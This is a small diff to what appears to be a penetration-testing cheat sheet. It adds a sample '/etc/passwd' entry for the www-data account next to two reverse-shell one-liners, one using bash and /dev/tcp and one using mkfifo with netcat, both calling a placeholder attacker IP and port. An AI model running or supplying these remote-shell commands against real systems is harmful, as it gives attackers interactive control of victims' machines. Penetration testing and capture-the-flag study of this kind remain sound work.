@@ -26,7 +26,7 @@ Pipe output from things like `strings` here to finds hashes. The above will work
 
 `bash -i >& /dev/tcp/<attacker ip>/<listening port> 0>&1`
 
-or if no `-e`
+or if no `-e` like in `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`
 
 `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f`
 
